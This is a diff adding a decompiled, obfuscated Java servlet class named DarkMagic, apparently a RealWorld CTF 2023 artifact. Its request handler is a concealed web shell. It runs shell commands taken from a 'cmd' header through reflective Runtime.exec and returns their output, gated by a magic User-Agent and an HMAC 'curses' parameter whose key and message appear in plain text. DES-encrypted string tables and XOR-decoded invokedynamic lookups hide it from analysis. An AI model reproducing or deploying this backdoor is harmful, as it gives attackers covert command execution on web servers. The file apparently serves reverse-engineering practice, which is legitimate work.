@@ -1,0 +1,572 @@
+public class com.rw.rwctf2023.DarkMagic {
+    public void DarkMagic() {
+        invokespecial:Object(Object::<init>, this:DarkMagic)
+    }
+    
+    public static void invoke(javax.servlet.http.HttpServletRequest p0, javax.servlet.http.HttpServletResponse p1) {
+        stack_14B_1 : String [generated]
+        var_2_150 : String
+        var_3_230 : String
+        stack_28A_0 : String [generated]
+        var_4_28A : String
+        stack_4D8_0 : String [generated]
+        stack_5FA_0 : PrintWriter [generated]
+        stack_5F5_0 : String[] [generated]
+        stack_6DD_0 : String [generated]
+        stack_77A_1 : byte[] [generated]
+        stack_77A_2 : String [generated]
+        var_5_77D : SecretKeySpec
+        stack_7D4_0 : String [generated]
+        var_6_7D9 : Mac
+        var_7_88E : byte[]
+        stack_92A_0 : byte[] [generated]
+        var_7_92A : byte[]
+        stack_9B8_0 : String [generated]
+        stack_A01_0 : boolean [generated]
+        stack_BA3_0 : PrintWriter [generated]
+        stack_B5B_0 : String[] [generated]
+        stack_BA3_1 : String [generated]
+        stack_D2C_0 : Method [generated]
+        var_8_D2C : Method
+        stack_EB7_0 : Class [generated]
+        stack_EB7_1 : String [generated]
+        expr_DD8 : Class[] [generated]
+        stack_EB6_1 : int [generated]
+        stack_EB6_2 : Class [generated]
+        var_9_EBC : Method
+        stack_F5B_0 : Method [generated]
+        stack_F12_0 : String [generated]
+        stack_F5B_1 : Class [generated]
+        var_10_F60 : Object
+        stack_1105_0 : Method [generated]
+        stack_1105_1 : Object [generated]
+        expr_FEE : Object[] [generated]
+        stack_10C1_1 : int [generated]
+        stack_10C1_2 : String [generated]
+        var_11_110A : Object
+        stack_1203_0 : Class [generated]
+        stack_1203_1 : String [generated]
+        stack_1203_2 : Class[] [generated]
+        var_12_120B : Method
+        stack_135A_0 : Method [generated]
+        stack_135A_1 : Object [generated]
+        stack_1317_0 : int [generated]
+        stack_135A_2 : Object[] [generated]
+        var_13_1362 : InputStream
+        var_14_13FF : BufferedReader
+        stack_148F_0 : BufferedReader [generated]
+        var_15_1496 : String
+        stack_14E9_0 : PrintWriter [generated]
+        stack_14E9_1 : String [generated]
+        
+        stack_14B_1 = "cmd"
+        var_2_150 = javax.servlet.http.HttpServletRequest::getHeader(p0:HttpServletRequest, stack_14B_1:String)
+        var_3_230 = javax.servlet.http.HttpServletRequest::getHeader(p0:HttpServletRequest, "User-Agent")
+        stack_28A_0 = javax.servlet.http.HttpServletRequest::getParameter(p0:HttpServletRequest, "curses")
+        var_4_28A = stack_28A_0:String
+        if (logicalnot:boolean(java.util.Objects::equals(var_3_230:String, "The Argent Dawn"))) {
+            java.io.PrintWriter::println(javax.servlet.http.HttpServletResponse::getWriter(p1:HttpServletResponse), com.rw.rwctf2023.DarkMagic::randomChoice(getstatic:String[](DarkMagic::words)))
+            
+            return:void()
+        }
+        stack_4D8_0 = var_2_150:String
+        if (cmpeq:boolean(stack_4D8_0:String, aconstnull:String())) {
+            stack_5FA_0 = javax.servlet.http.HttpServletResponse::getWriter(p1:HttpServletResponse)
+            
+            stack_5F5_0 = getstatic:String[](DarkMagic::words)
+            
+            java.io.PrintWriter::println(stack_5FA_0:PrintWriter, com.rw.rwctf2023.DarkMagic::randomChoice(stack_5F5_0:String[]))
+            return:void()
+        }
+        stack_6DD_0 = "Victory or death!"
+        stack_77A_1 = checkcast:byte[](byte[].class, java.lang.String::getBytes(stack_6DD_0:String))
+        stack_77A_2 = "HmacSHA256"
+        var_5_77D = initobject:SecretKeySpec(SecretKeySpec::<init>, stack_77A_1:byte[], stack_77A_2:String)
+        stack_7D4_0 = "HmacSHA256"
+        var_6_7D9 = javax.crypto.Mac::getInstance(stack_7D4_0:String)
+        javax.crypto.Mac::init(var_6_7D9:Mac, var_5_77D:SecretKeySpec)
+        var_7_88E = checkcast:byte[](byte[].class, javax.crypto.Mac::doFinal(var_6_7D9:Mac, checkcast:byte[](byte[].class, java.lang.String::getBytes("Lok-tar ogar"))))
+        stack_92A_0 = checkcast:byte[](byte[].class, java.util.Base64$Encoder::encode(java.util.Base64::getEncoder(var_7_88E:byte[]))
+        var_7_92A = stack_92A_0:byte[]
+        stack_9B8_0 = var_4_28A:String
+        stack_A01_0 = java.lang.String::equals(stack_9B8_0:String, initobject:String(String::<init>, var_7_92A:byte[]))
+        if (logicalnot:boolean(stack_A01_0:boolean)) {
+            stack_BA3_0 = javax.servlet.http.HttpServletResponse::getWriter(p1:HttpServletResponse)
+            stack_B5B_0 = getstatic:String[](DarkMagic::words)
+            stack_BA3_1 = com.rw.rwctf2023.DarkMagic::randomChoice(stack_B5B_0:String[])
+            java.io.PrintWriter::println(stack_BA3_0:PrintWriter, stack_BA3_1:String)
+            return:void()
+        }
+        stack_D2C_0 = java.lang.Class::getMethod(java.lang.Class::forName("java.lang.Runtime"), "getRuntime", newarray:Class[](java.lang.Class.class, ldc:int(0)))
+        var_8_D2C = stack_D2C_0:Method
+        stack_EB7_0 = java.lang.Class::forName("java.lang.Runtime")
+        stack_EB7_1 = "exec"
+        expr_DD8 = initarray:Class[](java.lang.Class[].class, defaultvalue:Class(java.lang.Class.class))
+        stack_EB6_1 = ldc:int(0)
+        stack_EB6_2 = java.lang.Class::forName("java.lang.String")
+        storeelement:Class(expr_DD8:Class[], stack_EB6_1:int, stack_EB6_2:Class)
+        var_9_EBC = java.lang.Class::getMethod(stack_EB7_0:Class, stack_EB7_1:String, expr_DD8:Class[])
+        stack_F5B_0 = var_8_D2C:Method
+        stack_F12_0 = "java.lang.Runtime"
+        stack_F5B_1 = java.lang.Class::forName(stack_F12_0:String)
+        var_10_F60 = java.lang.reflect.Method::invoke(stack_F5B_0:Method, stack_F5B_1:Class, newarray:Object[](java.lang.Object.class, ldc:int(0)))
+        stack_1105_0 = var_9_EBC:Method
+        stack_1105_1 = var_10_F60:Object
+        expr_FEE = initarray:Object[](java.lang.Object[].class, defaultvalue:Object(java.lang.Object.class))
+        stack_10C1_1 = ldc:int(0)
+        stack_10C1_2 = var_2_150:String
+        storeelement:Object(expr_FEE:Object[], stack_10C1_1:int, stack_10C1_2:String[expected:Object])
+        var_11_110A = java.lang.reflect.Method::invoke(stack_1105_0:Method, stack_1105_1:Object, expr_FEE:Object[])
+        stack_1203_0 = java.lang.Class::forName("java.lang.Process")
+        stack_1203_1 = "getInputStream"
+        stack_1203_2 = newarray:Class[](java.lang.Class.class, ldc:int(0))
+        var_12_120B = java.lang.Class::getMethod(stack_1203_0:Class, stack_1203_1:String, stack_1203_2:Class[])
+        stack_135A_0 = var_12_120B:Method
+        stack_135A_1 = var_11_110A:Object
+        stack_1317_0 = ldc:int(0)
+        stack_135A_2 = newarray:Object[](java.lang.Object.class, stack_1317_0:int)
+        var_13_1362 = checkcast:InputStream(java.io.InputStream.class, java.lang.reflect.Method::invoke(stack_135A_0:Method, stack_135A_1:Object, stack_135A_2:Object[]))
+        var_14_13FF = initobject:BufferedReader(BufferedReader::<init>, initobject:InputStreamReader[expected:Reader](InputStreamReader::<init>, var_13_1362:InputStream))
+        
+        loop {
+            stack_148F_0 = var_14_13FF:BufferedReader
+            
+            if (cmpeq:boolean(var_15_1496 = java.io.BufferedReader::readLine(stack_148F_0:BufferedReader), aconstnull:String())) {
+                return:void()
+            }
+            
+            stack_14E9_0 = javax.servlet.http.HttpServletResponse::getWriter(p1:HttpServletResponse)
+            stack_14E9_1 = var_15_1496:String
+            
+            java.io.PrintWriter::println(stack_14E9_0:PrintWriter, stack_14E9_1:String)
+            
+            if (cmplt:boolean(getstatic:int(DarkMagic::v0001_d08dc2ad5360ca1b40c6901a8), ldc:int(0))) {
+                athrow(aconstnull:__Null())
+            }
+            
+            loopcontinue()
+        }
+    }
+    
+    private static java.lang.String randomChoice(java.lang.String[] p0) {
+        expr_B7 : Random [generated]
+        stack_1CB_1 : int [generated]
+        stack_213_1 : int [generated]
+
+        expr_B7 = initobject:Random(Random::<init>)
+        stack_1CB_1 = arraylength:int(p0:String[])
+        stack_213_1 = java.util.Random::nextInt(expr_B7:Random, stack_1CB_1:int)
+        return:String(loadelement:String(p0:String[], stack_213_1:int))
+    }
+    
+    static {
+        stack_D7_0 : int [generated]
+        expr_D7 : String[] [generated]
+        stack_207_1 : int [generated]
+        stack_2A0_1 : int [generated]
+        stack_2A0_2 : String [generated]
+        stack_3F0_1 : int [generated]
+        stack_3F0_2 : String [generated]
+        stack_448_1 : int [generated]
+        stack_448_2 : String [generated]
+        stack_53C_1 : int [generated]
+        stack_53C_2 : String [generated]
+        
+        putstatic:String[](DarkMagic::v0004_e0baaa98494ddd8fd1cb6637, newarray:String[](java.lang.String.class, ldc:int(118)))
+        putstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d, newarray:String[](java.lang.String.class, ldc:int(118)))
+        invokestatic:void(DarkMagic::v0156_ddf31117bc14aeded65c06)
+        putstatic:int(DarkMagic::v0002_7dc63c31afef80fb436a19, ldc:int(-762998497))
+        putstatic:int(DarkMagic::v0003_c0b6b371ae9ae0d408135c2, ldc:int(184))
+        stack_D7_0 = ldc:int(10)
+        expr_D7 = newarray:String[](java.lang.String.class, stack_D7_0:int)
+        storeelement:String(expr_D7:String[], ldc:int(0), "The hunter is nothing without the hunt.")
+        stack_207_1 = ldc:int(1)
+        storeelement:String(expr_D7:String[], stack_207_1:int, "You Are Not Prepared!")
+        stack_2A0_1 = ldc:int(2)
+        stack_2A0_2 = "You Are Not Prepared!"
+        storeelement:String(expr_D7:String[], stack_2A0_1:int, stack_2A0_2:String)
+        storeelement:String(expr_D7:String[], ldc:int(3), "You Are Not Prepared!")
+        storeelement:String(expr_D7:String[], ldc:int(4), "My destiny is my own.")
+        storeelement:String(expr_D7:String[], ldc:int(5), "You learned that the things that once tormented you could give you power.")
+        stack_3F0_1 = ldc:int(6)
+        stack_3F0_2 = "Sometimes the hand of fate must be forced."
+        storeelement:String(expr_D7:String[], stack_3F0_1:int, stack_3F0_2:String)
+        stack_448_1 = ldc:int(7)
+        stack_448_2 = "In times I wished your heart had made a different choice. In the end, I know it made the right one."
+        storeelement:String(expr_D7:String[], stack_448_1:int, stack_448_2:String)
+        storeelement:String(expr_D7:String[], ldc:int(8), "You wish to know the difference between the demons and us? They will stop at nothing to destroy our world. And we will sacrifice everything to save it.")
+        stack_53C_1 = ldc:int(9)
+        stack_53C_2 = "Betrayer... in truth, it was I who was betrayed. Still, I am hunted. Still, I am hated. Now, my blind eyes see what others cannot. And sometimes the hand of fate must be forced."
+        storeelement:String(expr_D7:String[], stack_53C_1:int, stack_53C_2:String)
+        putstatic:String[](DarkMagic::words, expr_D7:String[])
+    }
+    
+    public static java.lang.Object v0014_0cc215bba1599024528ec63(java.lang.Object p0, java.lang.String p1, java.lang.Object p2, java.lang.Object p3, java.lang.Object p4, java.lang.Object p5, java.lang.Object p6, java.lang.String p7, java.lang.Object p8, java.lang.Object p9, java.lang.Object p10, java.lang.Object p11, java.lang.Object p12) {
+        var_11_88 : int
+        var_12_8F : char[]
+        var_13_94 : int
+        var_14_9E : char[]
+        var_15_A5 : byte[]
+        var_16_A8 : int
+        var_16_DD : Class<?>
+        var_14_E7 : char[]
+        var_15_EE : byte[]
+        var_17_F1 : int
+        var_17_127 : MethodType
+        var_14_131 : char[]
+        var_15_138 : byte[]
+        var_18_13B : int
+        
+        var_11_88 = and:int(xor:int(invokevirtual:int(Integer::intValue, checkcast:Integer(java.lang.Integer.class, p3:Object[expected:Integer])), getstatic:int(DarkMagic::v0002_7dc63c31afef80fb436a19)), ldc:int(255))
+        var_12_8F = invokevirtual:char[](String::toCharArray, p7:String)
+        var_13_94 = getstatic:int(DarkMagic::v0003_c0b6b371ae9ae0d408135c2)
+        var_14_9E = invokevirtual:char[](String::toCharArray, checkcast:String(java.lang.String.class, p4:Object[expected:String]))
+        var_15_A5 = newarray:byte[](byte.class, arraylength:int(var_14_9E:char[]))
+        var_16_A8 = ldc:int(0)
+        
+        while (cmplt:boolean(var_16_A8:int, arraylength:int(var_14_9E:char[]))) {
+            storeelement:byte(var_15_A5:byte[], var_16_A8:int, i2b:byte(and:int(xor:int(loadelement:char(var_14_9E:char[], var_16_A8:int), loadelement:char(var_12_8F:char[], rem:int(var_16_A8:int, arraylength:int(var_12_8F:char[])))), ldc:int(255))))
+            inc:int(var_16_A8, ldc:int(1))
+        }
+        
+        var_16_DD = invokestatic:Class<?>(Class<T>::forName, initobject:String(String::<init>, var_15_A5:byte[]))
+        var_14_E7 = invokevirtual:char[](String::toCharArray, checkcast:String(java.lang.String.class, p6:Object[expected:String]))
+        var_15_EE = newarray:byte[](byte.class, arraylength:int(var_14_E7:char[]))
+        var_17_F1 = ldc:int(0)
+        
+        while (cmplt:boolean(var_17_F1:int, arraylength:int(var_14_E7:char[]))) {
+            storeelement:byte(var_15_EE:byte[], var_17_F1:int, i2b:byte(xor:int(loadelement:char(var_14_E7:char[], var_17_F1:int), loadelement:char(var_12_8F:char[], rem:int(var_17_F1:int, arraylength:int(var_12_8F:char[]))))))
+            inc:int(var_17_F1, ldc:int(1))
+        }
+        
+        var_17_127 = invokestatic:MethodType(MethodType::fromMethodDescriptorString, initobject:String(String::<init>, var_15_EE:byte[]), invokevirtual:ClassLoader(Class::getClassLoader, var_16_DD:Class))
+        var_14_131 = invokevirtual:char[](String::toCharArray, checkcast:String(java.lang.String.class, p5:Object[expected:String]))
+        var_15_138 = newarray:byte[](byte.class, arraylength:int(var_14_131:char[]))
+        var_18_13B = ldc:int(0)
+        
+        while (cmplt:boolean(var_18_13B:int, arraylength:int(var_14_131:char[]))) {
+            storeelement:byte(var_15_138:byte[], var_18_13B:int, i2b:byte(xor:int(loadelement:char(var_14_131:char[], var_18_13B:int), loadelement:char(var_12_8F:char[], rem:int(var_18_13B:int, arraylength:int(var_12_8F:char[]))))))
+            inc:int(var_18_13B, ldc:int(1))
+        }
+        
+        if (cmpeq:boolean(var_11_88:int, var_13_94:int)) {
+            return:Object(initobject:MutableCallSite(MutableCallSite::<init>, invokevirtual:MethodHandle(MethodHandle::asType, invokevirtual:MethodHandle(Lookup::findStatic, checkcast:Lookup(java.lang.invoke.MethodHandles.Lookup.class, p0:Object[expected:Lookup]), var_16_DD:Class, initobject:String(String::<init>, var_15_138:byte[]), var_17_127:MethodType), checkcast:MethodType(java.lang.invoke.MethodType.class, p2:Object[expected:MethodType]))))
+        }
+        
+        return:Object(initobject:MutableCallSite(MutableCallSite::<init>, invokevirtual:MethodHandle(MethodHandle::asType, invokevirtual:MethodHandle(Lookup::findVirtual, checkcast:Lookup(java.lang.invoke.MethodHandles.Lookup.class, p0:Object[expected:Lookup]), var_16_DD:Class, initobject:String(String::<init>, var_15_138:byte[]), var_17_127:MethodType), checkcast:MethodType(java.lang.invoke.MethodType.class, p2:Object[expected:MethodType]))))
+    }
+    
+    private static java.lang.Object v0007_1c4783e5646d75c310ec(java.lang.invoke.MethodHandles.Lookup p0, java.lang.String p1, java.lang.invoke.MethodType p2) {
+        return:Object(initobject:MutableCallSite[expected:Object](MutableCallSite::<init>, invokevirtual:MethodHandle(MethodHandle::asType, invokevirtual:MethodHandle(Lookup::findStatic, p0:Lookup, ldc:Class<DarkMagic>(com.rw.rwctf2023.DarkMagic.class), ldc:String("v0182_b11b5b2ea78b5c191b53126d"), invokestatic:MethodType(MethodType::fromMethodDescriptorString, ldc:String("(IJ)Ljava/lang/String;"), invokevirtual:ClassLoader(Class<T>::getClassLoader, ldc:Class<DarkMagic>(com.rw.rwctf2023.DarkMagic.class)))), p2:MethodType)))
+    }
+    
+    private static java.lang.String v0182_b11b5b2ea78b5c191b53126d(int p0, long p1) {
+        var_3_8F : Cipher
+        var_4_96 : SecretKeyFactory
+        var_5_9C : byte[]
+        var_6_A9 : int
+        
+        if (cmpeq:boolean(loadelement:String(getstatic:String[](DarkMagic::v0004_e0baaa98494ddd8fd1cb6637), p0:int), aconstnull:String())) {
+            p1 = xor:long(p1:long, ldc:long(96L))
+            p1 = xor:long(p1:long, ldc:long(4557847193904795529L))
+            var_3_8F = invokestatic:Cipher(Cipher::getInstance, ldc:String("DES/CBC/PKCS5Padding"))
+            var_4_96 = invokestatic:SecretKeyFactory(SecretKeyFactory::getInstance, ldc:String("DES"))
+            var_5_9C = newarray:byte[](byte.class, ldc:int(8))
+            storeelement:byte(var_5_9C:byte[], ldc:int(0), i2b:byte(l2i:int(ushr:long(p1:long, ldc:int(56)))))
+            var_6_A9 = ldc:int(1)
+            
+            while (cmplt:boolean(var_6_A9:int, ldc:int(8))) {
+                storeelement:byte(var_5_9C:byte[], var_6_A9:int, i2b:byte(l2i:int(shl:long(ushr:long(shl:long(p1:long, mul:int(var_6_A9:int, ldc:int(8))), ldc:int(56)), p0:int))))
+                inc:int(var_6_A9, ldc:int(1))
+            }
+            
+            invokevirtual:void(Cipher::init, var_3_8F:Cipher, ldc:int(2), invokevirtual:SecretKey(SecretKeyFactory::generateSecret, var_4_96:SecretKeyFactory, initobject:DESKeySpec(DESKeySpec::<init>, var_5_9C:byte[])), initobject:IvParameterSpec[expected:AlgorithmParameterSpec](IvParameterSpec::<init>, newarray:byte[](byte.class, ldc:int(8))))
+            storeelement:String(getstatic:String[](DarkMagic::v0004_e0baaa98494ddd8fd1cb6637), p0:int, initobject:String(String::<init>, invokevirtual:byte[](Cipher::doFinal, var_3_8F:Cipher, invokevirtual:byte[](Decoder::decode, invokestatic:Decoder(Base64::getDecoder), loadelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), p0:int)))))
+        }
+        
+        return:String(loadelement:String(getstatic:String[](DarkMagic::v0004_e0baaa98494ddd8fd1cb6637), p0:int))
+    }
+    
+    private static void v0156_ddf31117bc14aeded65c06() {
+        var_0_82 : long
+        var_2_89 : Cipher
+        var_3_90 : SecretKeyFactory
+        var_4_95 : byte[]
+        var_5_A2 : int
+        var_5_E0 : int
+        var_6_E3 : int
+        
+        putstatic:long(DarkMagic::v0006_51cb98f94cbf115ea9ea, ldc:long(-1787229411635844770L))
+        var_0_82 = xor:long(getstatic:long(DarkMagic::v0006_51cb98f94cbf115ea9ea), ldc:long(4557847193904795529L))
+        var_2_89 = invokestatic:Cipher(Cipher::getInstance, ldc:String("DES/CBC/PKCS5Padding"))
+        var_3_90 = invokestatic:SecretKeyFactory(SecretKeyFactory::getInstance, ldc:String("DES"))
+        var_4_95 = newarray:byte[](byte.class, ldc:int(8))
+        storeelement:byte(var_4_95:byte[], ldc:int(0), i2b:byte(l2i:int(ushr:long(var_0_82:long, ldc:int(56)))))
+        var_5_A2 = ldc:int(1)
+        
+        while (cmplt:boolean(var_5_A2:int, ldc:int(8))) {
+            storeelement:byte(var_4_95:byte[], var_5_A2:int, i2b:byte(l2i:int(ushr:long(shl:long(var_0_82:long, mul:int(var_5_A2:int, ldc:int(8))), ldc:int(56)))))
+            inc:int(var_5_A2, ldc:int(1))
+        }
+        
+        invokevirtual:void(Cipher::init, var_2_89:Cipher, ldc:int(2), invokevirtual:SecretKey(SecretKeyFactory::generateSecret, var_3_90:SecretKeyFactory, initobject:DESKeySpec(DESKeySpec::<init>, var_4_95:byte[])), initobject:IvParameterSpec[expected:AlgorithmParameterSpec](IvParameterSpec::<init>, newarray:byte[](byte.class, ldc:int(8))))
+        var_5_E0 = ldc:int(1)
+        var_6_E3 = ldc:int(0)
+        
+        while (cmplt:boolean(var_6_E3:int, var_5_E0:int)) {
+            switch (var_6_E3:int) {
+                case 0:
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(0), ldc:String("0Ez0xGp13BQ6RMtXF5tAvqKzYLqqGvPf"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(1), ldc:String("op+YbNuekTK0S45W1onhqtDnLIXumrbyYVCTQtmLZSwjUiXYJobLKhUNP4IELjVg"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(2), ldc:String("smNQZrUyrGImLGZMFrpCgSXkYfrLrRggmIlBi8KORnBtmL3FYw7kzQQ4nco9poNhFkAA6iXHnnKpsK2wpb3VpCw+HM8mJa24O6hl2m3YXYrz7Bk4DEgvjcrf60MR7M23okgGVu+cfR0="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(3), ldc:String("90G07n34WWT19KwEsDRxaJlDtRzf1iTTnW4F53w2GwbLmQG9yhSVXZFkwRueWWaCcWQL/+4eIECxk1HQP5FytyRTSxB0vGutVxuxzGebOT28GQc66WLZFfJyrEJSILLB6KGrDNhdkjagDBd4mR88VfqMeFZ2C/8+TxyJ2t97zZxSH4UK48DlzSNusi4CXv0Q5DH87jd8kH4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(4), ldc:String("/R+Em4Piwcc="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(5), ldc:String("anlKcumGi1H3PlOxaSsEeX8UE16KFzEE"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(6), ldc:String("X71CqQ6zYzHOnWyYRWpRwfpykaFq/kf/"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(7), ldc:String("VlHl8rMmKaVsF6dqyOFsaZ49a8Gf/eHu"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(8), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(9), ldc:String("Oo3EyAPLBuui9W6G+sGMcg=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(10), ldc:String("Fee/mGwser8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(11), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(12), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(13), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(14), ldc:String("JA+fI7CGo/nruLNnVHiLwA=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(15), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(16), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(17), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(18), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(19), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(20), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(21), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(22), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(23), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(24), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(25), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(26), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(27), ldc:String("I1CW8WOS5/+xoqhgAPKFDU4j4wdNhcG0"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(28), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(29), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(30), ldc:String("IJcG6Od4P8m7Q3/LSdRNhg=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(31), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(32), ldc:String("IJcG6Od4P8m7Q3/LSdRNhg=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(33), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(34), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(35), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(36), ldc:String("E4k0TOh0fe8oI8WIYgaA+A=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(37), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(38), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(39), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
